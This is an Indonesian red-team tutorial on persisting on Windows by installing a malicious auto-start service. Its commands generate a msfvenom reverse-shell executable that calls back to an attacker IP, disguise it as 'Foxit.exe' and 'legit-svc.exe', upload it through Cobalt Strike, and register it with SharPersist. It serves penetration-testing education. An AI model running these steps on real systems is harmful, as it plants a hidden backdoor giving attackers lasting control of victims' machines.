---
title: 'Persistence via Windows Services'
date: 2023-07-26 10:58:22 +0700
categories: ['Windows Hacking', 'Windows Persistence']
tags: [red team, persistence, windows hacking, windows persistence, service exploit]     # TAG names should always be lowercase
author: nairpaa
---

Seperti yang kita lihat pada [materi](/posts/windows-service/) sebelumnya, ada banyak Windows *service* yang berjalan sebagai `SISTEM`. 

Berbagai cara mengeksploitasi *service* untuk eskalasi hak istimewa juga bertindak sebagai persistensi, tetapi dengan mengorbankan *service* yang sah. 

Sebagai gantinya, kita dapat membuat *service* kita sendiri yang tidak akan berdampak pada layanan yang sudah ada.

## 0x1 - Exploitation Stages

### Step 1: Create Malware and Upload

```bash
# Contoh buat malware dengan MSF
➜ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
```

```bash
# Contoh upload file pada Cobalt Strike
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe
```

### Step 2: Add Malware to Registry AutoRun

```powershell
PS > .\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

Perintah di atas akan membuat *service* baru dalam keadaan `STOPPED`, tetapi dengan `START_TYPE` diatur ke `AUTO_START`.  Ini berarti *service* tidak akan berjalan sampai komputer di-*reboot*.  Ketika komputer dijalankan, *service* tersebut juga akan berjalan.

---

## 0x2 - References

- https://github.com/mandiant/SharPersist
- https://pentestlab.blog/2019/10/07/persistence-new-service/